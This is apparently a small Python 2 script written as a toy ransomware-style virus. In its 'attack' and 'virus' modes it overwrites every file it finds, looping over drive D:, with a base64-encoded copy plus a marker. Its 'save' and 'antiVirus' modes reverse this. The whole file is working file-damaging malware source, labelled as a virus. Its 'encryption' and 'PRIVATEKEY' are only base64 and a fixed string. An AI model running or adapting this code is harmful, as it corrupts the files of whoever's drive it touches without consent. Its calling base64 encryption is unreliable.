#coding: utf
import base64
import os, sys
import traceback
import time
from findFiles import *

def encrypting(listFiles):
    PRIVATEKEY = base64.b64encode('Coders rule the world')
    for file in listFiles:
        try:
            with open(file, 'rb') as f:
                content = f.read()
            if content[-28:] == PRIVATEKEY: #不重复加密
                pass
            else:
                with open(file, 'wb') as f:
                    f.write(base64.b64encode(content))
                    f.write(PRIVATEKEY)
        except:
            traceback.print_exc()
    print 'finish'
    
def decrypting(listFiles):
    PRIVATEKEY = base64.b64encode('Coders rule the world')
    for file in listFiles:
        try:
            with open(file, 'rb') as f:
                content = f.read()
            if content[-28:] == PRIVATEKEY: # 不重复解密
                with open(file, 'wb') as f:    
                    content = content[0:-28]
                    f.write(base64.b64decode(content))
            else:
                pass
        except:
            traceback.print_exc()
            
def attack():
    encrypting(findFilesInDestination())

def save():
    decrypting(findFilesInDestination())

def virus():
    print 'Start this virus loop'
    while(1):
        if (os.path.exists('D:')):
            encrypting(iterateFiles('D:'))
        else:
            print 'No USB'
        time.sleep(5)
            
def antiVirus():
    print 'Start this antiVirus loop'
    while(1):
        if (os.path.exists('D:')):
            decrypting(iterateFiles('D:'))
            print 'finish one turn'
        else:
            print 'No USB'
        time.sleep(5)
        
        
if __name__ == '__main__':
    start = time.time()
    # print len(sys.argv)
    if (sys.argv[-1] == 'attack'):
        attack()
    elif (sys.argv[-1] == 'save'):
        save()
    elif (sys.argv[-1] == 'virus'):
        virus()
    elif (sys.argv[-1] == 'antiVirus'):
        antiVirus()
    else:
        print "Wrong input!"
    end = time.time()
    print 'It took {} seconds'.format(end - start)
    
    
    